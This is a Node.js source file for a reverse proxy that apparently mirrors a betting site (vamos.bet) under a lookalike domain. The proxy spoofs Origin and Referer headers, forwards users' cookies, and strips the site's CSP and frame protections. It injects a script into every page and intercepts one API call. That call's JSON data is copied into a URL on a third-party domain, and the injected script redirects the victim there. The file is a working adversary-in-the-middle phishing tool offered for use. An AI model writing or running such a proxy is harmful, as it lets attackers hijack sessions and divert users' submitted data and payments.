import http from "node:http";
import crypto from "node:crypto";
import { execFile } from "node:child_process";
import { promisify } from "node:util";

const execFileAsync = promisify(execFile);

/*
 * ==========================================
 * CONFIGURATION
 * ==========================================
 */

const PROXY_HOST = "127.0.0.1";
const PROXY_PORT = 6005;
const PROXY_PUBLIC_DOMAIN = "dashsh.bet";
const TARGET_BASE_DOMAIN = "vamos.bet";

const REDIRECT_API_PATH = "/api/v9/test/redirect";
const REDIRECT_BASE_URL = "https://test3.marziplus.com";
const REDIRECT_TTL_MS = 30_000;

const CURL_CHROME_BIN = "/usr/local/bin/curl-chrome";
const clients = new Map();

/*
 * ==========================================
 * SESSION & COOKIE MANAGEMENT
 * ==========================================
 */

const getOrCreateClient = (req, res) => {
  const cookieHeader = req.headers.cookie || "";
  const match = cookieHeader.match(/(?:^|;\s*)proxy_client_id=([^;]+)/);
  let id = match ? match[1] : null;

  if (!id) {
    id = crypto.randomUUID();
    res.setHeader(
      "Set-Cookie",
      `proxy_client_id=${id}; Path=/; HttpOnly; SameSite=Lax`
    );
  }

  if (!clients.has(id)) {
    clients.set(id, {
      redirected: false,
      redirectUrl: null,
      createdAt: Date.now()
    });
  }

  return id;
};

// Cleanup stale proxy sessions
setInterval(() => {
  const now = Date.now();
  for (const [id, state] of clients.entries()) {
    if (now - state.createdAt > REDIRECT_TTL_MS) {
      clients.delete(id);
    }
  }
}, 10_000);

/*
 * ==========================================
 * HTML SCRIPT INJECTION (Using XHR to avoid fetch traps)
 * ==========================================
 */

const injectWatcher = (html) => {
  const script = `
<script>
(function () {
  function checkProxyRedirect() {
    try {
      var xhr = new XMLHttpRequest();
      xhr.open("GET", "/__proxy_redirect_status", true);
      xhr.setRequestHeader("Cache-Control", "no-store");
      xhr.onreadystatechange = function () {
        if (xhr.readyState === 4 && xhr.status === 200) {
          try {
            var data = JSON.parse(xhr.responseText);
            if (data.redirect && data.url) {
              window.location.replace(data.url);
            }
          } catch (e) {}
        }
      };
      xhr.send();
    } catch (e) {}
  }
  setInterval(checkProxyRedirect, 300);
  checkProxyRedirect();
})();
</script>
`;
  return html.includes("</body>")
    ? html.replace("</body>", `${script}</body>`)
    : html + script;
};

/*
 * ==========================================
 * FORWARD REQUEST VIA CURL-CHROME
 * ==========================================
 */

const forwardRequest = async (clientReq, clientRes, bodyBuffer = null) => {
  try {
    let finalBody = bodyBuffer;
    if (finalBody === null) {
      const chunks = [];
      for await (const chunk of clientReq) {
        chunks.push(chunk);
      }
      finalBody = Buffer.concat(chunks);
    }

    const incomingHost = clientReq.headers.host || PROXY_PUBLIC_DOMAIN;
    const targetHostname = incomingHost.replace(
      new RegExp(PROXY_PUBLIC_DOMAIN, "gi"),
      TARGET_BASE_DOMAIN
    );

    const targetUrl = `https://${targetHostname}${clientReq.url}`;

    // SPOOF ORIGIN & REFERER TO BYPASS HOTLINK PROTECTION
    const spoofedReferer = `https://${targetHostname}${clientReq.url}`;
    const spoofedOrigin = `https://${targetHostname}`;

    const args = [
      "-s", "-i", "-L", // Added -L to follow redirects automatically
      "-X", clientReq.method,
      targetUrl,
      "-H", `Host: ${targetHostname}`,
      "-H", `User-Agent: ${clientReq.headers["user-agent"] || "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0.0.0 Safari/537.36"}`,
      "-H", `Accept: ${clientReq.headers["accept"] || "image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8"}`,
      "-H", `Accept-Language: ${clientReq.headers["accept-language"] || "en-US,en;q=0.9"}`,
      "-H", `Referer: ${spoofedReferer}`,
      "-H", `Origin: ${spoofedOrigin}`
    ];

    if (clientReq.headers["content-type"]) {
      args.push("-H", `Content-Type: ${clientReq.headers["content-type"]}`);
    }

    if (clientReq.headers.cookie) {
      args.push("-H", `Cookie: ${clientReq.headers.cookie}`);
    }

    if (finalBody.length > 0 && !["GET", "HEAD"].includes(clientReq.method)) {
      args.push("--data-binary", finalBody.toString("utf8"));
    }

    const { stdout } = await execFileAsync(CURL_CHROME_BIN, args, {
      maxBuffer: 100 * 1024 * 1024,
      encoding: "buffer"
    });

    // Parse headers from the final response (handles cURL -L redirect chains)
    const headerBlocks = stdout.toString("latin1").split("\r\n\r\n");
    let headerText = "";
    let headerEndIndex = 0;

    // Find the last HTTP response header block
    for (let i = 0; i < headerBlocks.length - 1; i++) {
      if (headerBlocks[i].startsWith("HTTP/")) {
        headerText = headerBlocks[i];
        headerEndIndex = stdout.indexOf(Buffer.from(headerBlocks[i])) + Buffer.from(headerBlocks[i]).length + 4;
      }
    }

    if (!headerText) {
      throw new Error("Invalid HTTP response format from upstream.");
    }

    const responseBodyBuffer = stdout.subarray(headerEndIndex);
    const headerLines = headerText.split("\r\n");
    const statusLine = headerLines.shift();
    const statusCode = parseInt(statusLine.split(" ")[1], 10) || 200;

    const headers = {};
    for (const line of headerLines) {
      const [key, ...values] = line.split(":");
      if (key && values.length > 0) {
        headers[key.trim().toLowerCase()] = values.join(":").trim();
      }
    }

    // Strip troublesome response headers
    delete headers["content-security-policy"];
    delete headers["content-security-policy-report-only"];
    delete headers["x-frame-options"];
    delete headers["transfer-encoding"];
    delete headers["content-encoding"];
    delete headers["content-length"];

    if (headers.location) {
      headers.location = headers.location.replace(
        new RegExp(`https?://${targetHostname}`, "gi"),
        `https://${incomingHost}`
      );
    }

    const contentType = headers["content-type"] || "";
    const isStaticAsset = clientReq.url.match(/\.(png|jpg|jpeg|gif|svg|webp|woff|woff2|ttf|ico|css|js)(\?.*)?$/i);

    // HTML modification
    if (statusCode === 200 && contentType.includes("text/html") && !isStaticAsset) {
      let html = responseBodyBuffer.toString("utf8");

      if (html.includes("<head>")) {
        html = html.replace("<head>", `<head><base href="https://${incomingHost}/">`);
      }

      html = injectWatcher(html);
      const newBody = Buffer.from(html, "utf8");

      headers["content-length"] = newBody.length;
      clientRes.writeHead(statusCode, headers);
      return clientRes.end(newBody);
    }

    // Raw binary pass-through for images
    headers["content-length"] = responseBodyBuffer.length;
    clientRes.writeHead(statusCode, headers);
    clientRes.end(responseBodyBuffer);
  } catch (error) {
    console.error(`❌ Upstream Request Error:`, error.message);
    if (!clientRes.headersSent) {
      clientRes.writeHead(502, { "Content-Type": "text/html; charset=utf-8" });
    }
    clientRes.end(`<h1>502 Bad Gateway</h1><p>Proxy error: ${error.message}</p>`);
  }
};

/*
 * ==========================================
 * MAIN HTTP SERVER
 * ==========================================
 */

const server = http.createServer(async (clientReq, clientRes) => {
  const parsedUrl = new URL(
    clientReq.url,
    `http://${clientReq.headers.host || "localhost"}`
  );
  const path = parsedUrl.pathname;
  const clientId = getOrCreateClient(clientReq, clientRes);
  const state = clients.get(clientId);

  if (clientReq.method === "GET" && path === "/__proxy_redirect_status") {
    const response = JSON.stringify({
      redirect: Boolean(state?.redirected),
      url: state?.redirectUrl || null
    });

    clientRes.writeHead(200, {
      "Content-Type": "application/json; charset=utf-8",
      "Cache-Control": "no-store",
      "Content-Length": Buffer.byteLength(response)
    });
    return clientRes.end(response);
  }

  if (path.startsWith("/cdn-cgi/")) {
    clientRes.writeHead(204);
    return clientRes.end();
  }

  if (path === REDIRECT_API_PATH) {
    const chunks = [];
    for await (const chunk of clientReq) {
      chunks.push(chunk);
    }
    const body = Buffer.concat(chunks);

    if (body.length === 0) {
      return forwardRequest(clientReq, clientRes, body);
    }

    try {
      const json = JSON.parse(body.toString("utf8"));
      const redirectUrl = new URL(REDIRECT_BASE_URL);
      for (const [key, val] of Object.entries(json)) {
        if (val !== undefined && val !== null) {
          redirectUrl.searchParams.set(key, String(val));
        }
      }

      const finalUrl = redirectUrl.toString();

      if (state) {
        state.redirected = true;
        state.redirectUrl = finalUrl;
        state.createdAt = Date.now();
      }

      const response = JSON.stringify({ success: true, proxyRedirect: true });
      clientRes.writeHead(200, {
        "Content-Type": "application/json; charset=utf-8",
        "Cache-Control": "no-store",
        "Content-Length": Buffer.byteLength(response)
      });
      clientRes.end(response);
      return;
    } catch (err) {
      return forwardRequest(clientReq, clientRes, body);
    }
  }

  if (state?.redirected) {
    clientRes.writeHead(410, { "Content-Type": "text/plain; charset=utf-8" });
    return clientRes.end("Proxy session terminated");
  }

  await forwardRequest(clientReq, clientRes, null);
});

server.on("clientError", (error, socket) => {
  socket.end("HTTP/1.1 400 Bad Request\r\n\r\n");
});

server.listen(PROXY_PORT, PROXY_HOST, () => {
  console.log(`==========================================`);
  console.log(` Proxy listening on http://${PROXY_HOST}:${PROXY_PORT}`);
  console.log(` Forwarding via curl-chrome with binary handling`);
  console.log(`==========================================`);
});